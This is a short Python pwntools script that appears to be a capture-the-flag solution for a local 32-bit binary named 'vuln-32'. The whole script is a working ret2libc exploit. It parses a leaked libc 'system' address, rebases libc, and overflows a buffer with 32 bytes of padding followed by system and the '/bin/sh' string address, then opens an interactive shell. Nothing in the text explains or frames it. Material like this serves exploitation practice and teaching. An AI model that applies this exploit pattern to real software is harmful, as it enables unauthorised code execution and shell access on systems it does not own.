#!/usr/bin/python2
from pwn import *

p = process('./vuln-32')
elf = context.binary = ELF('./vuln-32')
binary = elf.libc
# binary = ELF('./vuln-32')

p.recvuntil('at: ')
leak = int(p.recvline(),16)
print(hex(leak))

binary.address = leak - binary.sym['system']

payload = flat(
    'A'*32,
    binary.sym['system'],
    0x0,
    next(binary.search(b'/bin/sh'))
)

p.sendline(payload)
p.interactive()